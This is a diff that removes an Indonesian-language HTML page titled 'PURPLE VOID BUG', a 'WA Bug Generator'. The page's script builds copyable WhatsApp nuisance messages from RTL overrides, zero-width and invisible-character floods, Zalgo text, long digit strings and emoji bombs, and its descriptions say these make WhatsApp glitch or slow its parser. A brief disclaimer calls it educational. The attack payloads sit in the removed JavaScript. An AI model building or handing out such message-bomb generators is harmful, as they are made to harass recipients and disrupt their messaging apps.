-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 28px 24px;
-    position: relative;
-    overflow: hidden;
-    animation: cardIn 0.6s ease both;
-    transition: transform 0.25s ease, box-shadow 0.25s ease, border-color 0.25s ease;
-  }
-  .card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 2px;
-    background: linear-gradient(90deg, var(--p2), var(--glow), var(--p2));
-    background-size: 200%;
-    animation: shimmer 3s linear infinite;
-    opacity: 0;
-    transition: opacity 0.3s;
-  }
-  .card:hover::before { opacity: 1; }
-  .card:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 20px 60px rgba(106,0,184,0.35);
-    border-color: var(--p2);
-  }
-  @keyframes shimmer { 0%{background-position:0%} 100%{background-position:200%} }
-  @keyframes cardIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
-  .card:nth-child(1){ animation-delay:0.1s }
-  .card:nth-child(2){ animation-delay:0.2s }
-  .card:nth-child(3){ animation-delay:0.3s }
-  .card:nth-child(4){ animation-delay:0.4s }
-  .card:nth-child(5){ animation-delay:0.5s }
-  .card:nth-child(6){ animation-delay:0.6s }
-
-  .card-icon {
-    width: 44px; height: 44px;
-    border-radius: 12px;
-    background: linear-gradient(135deg, var(--p1), var(--p2));
-    display: flex; align-items: center; justify-content: center;
-    font-size: 20px;
-    margin-bottom: 16px;
-    box-shadow: 0 4px 20px rgba(155,48,255,0.4);
-  }
-
-  .card h3 {
-    font-family: 'Syne', sans-serif;
-    font-size: 15px;
-    font-weight: 700;
-    color: #fff;
-    margin-bottom: 8px;
-  }
-
-  .card p { font-size: 12px; color: rgba(238,218,255,0.5); line-height: 1.7; }
-
-  /* Bug text display area */
-  .bug-display {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 20px;
-    padding: 32px;
-    margin-bottom: 40px;
-    position: relative;
-    overflow: hidden;
-    animation: cardIn 0.7s 0.3s ease both;
-  }
-  .bug-display::after {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(circle at 80% 20%, rgba(155,48,255,0.1), transparent 60%);
-    pointer-events: none;
-  }
-
-  .terminal-bar {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    margin-bottom: 20px;
-  }
-  .dot { width:12px; height:12px; border-radius:50%; }
-  .dot-r{background:#ff5f57} .dot-y{background:#febc2e} .dot-g{background:#28c840}
-  .terminal-title { font-size:11px; color:rgba(238,218,255,0.3); margin-left: 8px; letter-spacing:2px; }
-
-  .bug-text {
-    font-family: 'Space Mono', monospace;
-    font-size: clamp(12px, 2vw, 14px);
-    color: var(--p4);
-    line-height: 2.2;
-    word-break: break-all;
-    white-space: pre-wrap;
-    min-height: 60px;
-    position: relative;
-  }
-  .bug-text .cursor-blink {
-    display: inline-block;
-    width: 2px; height: 1.1em;
-    background: var(--p3);
-    animation: blink 1s step-end infinite;
-    vertical-align: text-bottom;
-    margin-left: 2px;
-  }
-  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
-
-  /* Input */
-  .input-row {
-    display: flex;
-    gap: 12px;
-    margin-top: 20px;
-    flex-wrap: wrap;
-  }
-
-  input[type="text"] {
-    flex: 1;
-    min-width: 200px;
-    background: rgba(255,255,255,0.04);
-    border: 1px solid var(--border);
-    color: var(--p5);
-    font-family: 'Space Mono', monospace;
-    font-size: 13px;
-    padding: 12px 18px;
-    border-radius: 10px;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
-  }
-  input[type="text"]:focus {
-    border-color: var(--p3);
-    box-shadow: 0 0 20px rgba(155,48,255,0.2);
-  }
-  input[type="text"]::placeholder { color: rgba(238,218,255,0.2); }
-
-  .btn {
-    font-family: 'Syne', sans-serif;
-    font-weight: 700;
-    font-size: 13px;
-    letter-spacing: 1px;
-    padding: 12px 26px;
-    border-radius: 10px;
-    border: none;
-    cursor: pointer;
-    transition: all 0.2s ease;
-    position: relative;
-    overflow: hidden;
-  }
-  .btn-primary {
-    background: linear-gradient(135deg, var(--p2), var(--p3));
-    color: #fff;
-    box-shadow: 0 4px 25px rgba(155,48,255,0.45);
-  }
-  .btn-primary:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 35px rgba(155,48,255,0.6);
-  }
-  .btn-primary:active { transform: scale(0.97); }
-  .btn-ghost {
-    background: transparent;
-    color: var(--p4);
-    border: 1px solid var(--border);
-  }
-  .btn-ghost:hover { border-color: var(--p3); background: rgba(155,48,255,0.1); }
-
-  /* Copy success toast */
-  .toast {
-    position: fixed;
-    bottom: 30px; left: 50%; transform: translateX(-50%) translateY(80px);
-    background: linear-gradient(135deg, var(--p1), var(--p2));
-    color: #fff;
-    padding: 12px 28px;
-    border-radius: 999px;
-    font-size: 13px;
-    font-family: 'Syne', sans-serif;
-    box-shadow: 0 8px 40px rgba(106,0,184,0.5);
-    z-index: 9999;
-    transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1), opacity 0.4s;
-    opacity: 0;
-    pointer-events: none;
-  }
-  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-
-  /* Separator */
-  .sep {
-    height: 1px;
-    background: linear-gradient(90deg, transparent, var(--border), transparent);
-    margin: 50px 0;
-  }
-
-  /* Footer */
-  .footer {
-    text-align: center;
-    font-size: 11px;
-    color: rgba(238,218,255,0.2);
-    letter-spacing: 2px;
-  }
-
-  /* Scanline overlay */
-  .scanlines {
-    position: fixed; inset: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(0,0,0,0.04) 2px,
-      rgba(0,0,0,0.04) 4px
-    );
-    pointer-events: none;
-    z-index: 200;
-    opacity: 0.5;
-  }
-
-  /* Number counter */
-  .stat-row {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 16px;
-    margin-bottom: 48px;
-    animation: cardIn 0.7s 0.2s ease both;
-  }
-  .stat {
-    text-align: center;
-    padding: 24px 16px;
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    transition: transform 0.2s;
-  }
-  .stat:hover { transform: scale(1.03); border-color: var(--p2); }
-  .stat-num {
-    font-family: 'Syne', sans-serif;
-    font-size: clamp(1.5rem, 4vw, 2.4rem);
-    font-weight: 800;
-    background: linear-gradient(135deg, var(--p4), var(--p3));
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-  .stat-label { font-size: 10px; color: rgba(238,218,255,0.35); letter-spacing: 2px; margin-top: 4px; }
-
-  @media(max-width:500px){
-    .grid { grid-template-columns: 1fr; }
-    .stat-row { grid-template-columns: 1fr; }
-  }
-</style>
-</head>
-<body>
-
-<div class="cursor" id="cursor"></div>
-<div class="cursor-trail" id="cursorTrail"></div>
-<div class="bg-grid"></div>
-<div class="orb orb1"></div>
-<div class="orb orb2"></div>
-<div class="orb orb3"></div>
-<div class="scanlines"></div>
-
-<div class="toast" id="toast">✓ Tersalin ke clipboard!</div>
-
-<main>
-  <!-- Header -->
-  <div class="header">
-    <div class="badge">⚡ WA Bug Generator</div>
-    <h1>PURPLE<br>VOID BUG</h1>
-    <p class="subtitle">Karakter khusus yang membuat WhatsApp mengalami glitch visual</p>
-  </div>
-
-  <!-- Stats -->
-  <div class="stat-row">
-    <div class="stat">
-      <div class="stat-num" id="countChar">0</div>
-      <div class="stat-label">Karakter</div>
-    </div>
-    <div class="stat">
-      <div class="stat-num" id="countBug">7</div>
-      <div class="stat-label">Jenis Bug</div>
-    </div>
-    <div class="stat">
-      <div class="stat-num">100%</div>
-      <div class="stat-label">Worth It</div>
-    </div>
-  </div>
-
-  <!-- Bug generator display -->
-  <div class="section-label">Terminal Output</div>
-  <div class="bug-display">
-    <div class="terminal-bar">
-      <div class="dot dot-r"></div>
-      <div class="dot dot-y"></div>
-      <div class="dot dot-g"></div>
-      <span class="terminal-title">BUG_OUTPUT.txt</span>
-    </div>
-    <div class="bug-text" id="bugOutput">Pilih jenis bug di bawah...<span class="cursor-blink"></span></div>
-    <div class="input-row">
-      <input type="text" id="customText" placeholder="Ketik teks custom (opsional)..." />
-      <button class="btn btn-primary" onclick="copyBug()">📋 Copy Bug</button>
-      <button class="btn btn-ghost" onclick="clearOutput()">✕ Clear</button>
-    </div>
-  </div>
-
-  <!-- Bug cards -->
-  <div class="section-label">Pilih Jenis Bug</div>
-  <div class="grid" id="bugGrid">
-    <!-- Cards injected by JS -->
-  </div>
-
-  <div class="sep"></div>
-
-  <!-- Warning -->
-  <div class="bug-display" style="border-color:#3d0066;">
-    <div class="terminal-bar">
-      <div class="dot dot-r"></div>
-      <span class="terminal-title">⚠ DISCLAIMER</span>
-    </div>
-    <p style="font-size:12px;line-height:2;color:rgba(238,218,255,0.45)">
-      Konten ini bersifat <span style="color:var(--p4)">edukatif</span> dan hanya untuk pemahaman karakter Unicode & behavior aplikasi.<br>
-      Gunakan dengan bijak. Jangan spam ke orang lain tanpa izin.<br>
-      Developer tidak bertanggung jawab atas penyalahgunaan.
-    </p>
-  </div>
-
-  <div class="footer">PURPLE VOID v1.0 — MADE WITH ⚡ & CSS</div>
-</main>
-
-<script>
-  // Custom cursor
-  const cur = document.getElementById('cursor');
-  const trail = document.getElementById('cursorTrail');
-  document.addEventListener('mousemove', e => {
-    cur.style.left = e.clientX + 'px';
-    cur.style.top  = e.clientY + 'px';
-    setTimeout(()=>{
-      trail.style.left = e.clientX + 'px';
-      trail.style.top  = e.clientY + 'px';
-    }, 80);
-  });
-
-  // Bug types
-  const bugs = [
-    {
-      icon: '💥', name: 'Crash Text',
-      desc: 'Kombinasi karakter RTL + special yang menyebabkan glitch render teks.',
-      generate: (t) => {
-        const base = t || 'WA BUG';
-        return '\u202E' + base.split('').reverse().join('') + '\u200F\u200E\u200B'.repeat(50);
-      }
-    },
-    {
-      icon: '🔄', name: 'RTL Flip',
-      desc: 'Teks terbalik menggunakan Right-to-Left Override character.',
-      generate: (t) => {
-        const base = t || 'Halo semua!';
-        return '\u202E' + base;
-      }
-    },
-    {
-      icon: '📛', name: 'Zero Width Spam',
-      desc: 'Pesan kosong palsu dengan zero-width characters tak terlihat.',
-      generate: (t) => {
-        return (t ? t + ' ' : '') + '\u200B\u200C\u200D\uFEFF'.repeat(200);
-      }
-    },
-    {
-      icon: '🌀', name: 'Unicode Flood',
-      desc: 'Banjir karakter Zalgo yang membuat teks terlihat "rusak" dan glitchy.',
-      generate: (t) => {
-        const zalgo = ['̴','̵','̶','̷','̸','͜','͝','͞','͟','͠','͢','̩','̪','̫','̬','̭','̮','̯','̰','̱'];
-        const base = t || 'GLITCH';
-        return base.split('').map(c => c + zalgo[Math.floor(Math.random()*zalgo.length)].repeat(8)).join('');
-      }
-    },
-    {
-      icon: '🔢', name: 'Number Overflow',
-      desc: 'String angka panjang yang bisa memperlambat parser WhatsApp.',
-      generate: (t) => {
-        return (t ? t + '\n' : '') + Array.from({length:50}, () => Math.floor(Math.random()*1e15)).join('');
-      }
-    },
-    {
-      icon: '🎭', name: 'Emoji Bomb',
-      desc: 'Susunan emoji kompleks yang berat dirender oleh renderer font.',
-      generate: (t) => {
-        const emo = ['👁️','🌀','💜','⚡','🔮','🌑','✨','🕳️'];
-        return (t ? t + ' ' : '') + Array.from({length:60}, ()=>emo[Math.floor(Math.random()*emo.length)]).join('');
-      }
-    },
-    {
-      icon: '🧿', name: 'Invisible Wall',
-      desc: 'Pesan yang tampak kosong namun berisi karakter formatting tersembunyi.',
-      generate: (t) => {
-        return (t ? t + '\n' : '') + '\u2063\u2064\u2065\u206A\u206B\u206C\u206D'.repeat(100);
-      }
-    }
-  ];
-
-  // Render cards
-  const grid = document.getElementById('bugGrid');
-  bugs.forEach((b, i) => {
-    const card = document.createElement('div');
-    card.className = 'card';
-    card.style.animationDelay = (0.1 + i*0.08) + 's';
-    card.innerHTML = `
-      <div class="card-icon">${b.icon}</div>
-      <h3>${b.name}</h3>
-      <p>${b.desc}</p>
-    `;
-    card.addEventListener('click', () => selectBug(b));
-    grid.appendChild(card);
-  });
-
-  let activeBug = null;
-
-  function selectBug(b) {
-    activeBug = b;
-    const custom = document.getElementById('customText').value;
-    const output = b.generate(custom);
-    const el = document.getElementById('bugOutput');
-    el.innerHTML = escapeHtml(output) + '<span class="cursor-blink"></span>';
-    document.getElementById('countChar').textContent = output.length;
-
-    // Highlight active card
-    document.querySelectorAll('.card').forEach(c => c.style.borderColor = '');
-    event.currentTarget.style.borderColor = 'var(--p3)';
-    event.currentTarget.style.boxShadow = '0 0 30px rgba(155,48,255,0.4)';
-  }
-
-  function escapeHtml(str) {
-    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  }
-
-  function copyBug() {
-    if (!activeBug) { showToast('Pilih jenis bug dulu!'); return; }
-    const custom = document.getElementById('customText').value;
-    const text = activeBug.generate(custom);
-    navigator.clipboard.writeText(text).then(() => {
-      showToast('✓ Tersalin ke clipboard!');
-    }).catch(() => {
-      // fallback
-      const ta = document.createElement('textarea');
-      ta.value = text; ta.style.position='fixed'; ta.style.opacity='0';
-      document.body.appendChild(ta); ta.select();
-      document.execCommand('copy'); document.body.removeChild(ta);
-      showToast('✓ Tersalin!');
-    });
-  }
-
-  function clearOutput() {
-    activeBug = null;
-    document.getElementById('bugOutput').innerHTML = 'Pilih jenis bug di bawah...<span class="cursor-blink"></span>';
-    document.getElementById('countChar').textContent = '0';
-    document.getElementById('customText').value = '';
-    document.querySelectorAll('.card').forEach(c => { c.style.borderColor=''; c.style.boxShadow=''; });
-  }
-
-  function showToast(msg) {
-    const t = document.getElementById('toast');
-    t.textContent = msg;
-    t.classList.add('show');
-    setTimeout(() => t.classList.remove('show'), 2500);
-  }
-
-  // Live update when typing
-  document.getElementById('customText').addEventListener('input', () => {
-    if (activeBug) {
-      const custom = document.getElementById('customText').value;
-      const output = activeBug.generate(custom);
-      document.getElementById('bugOutput').innerHTML = escapeHtml(output) + '<span class="cursor-blink"></span>';
-      document.getElementById('countChar').textContent = output.length;
-    }
-  });
-</script>
-</body>
-</html>
+                </html>
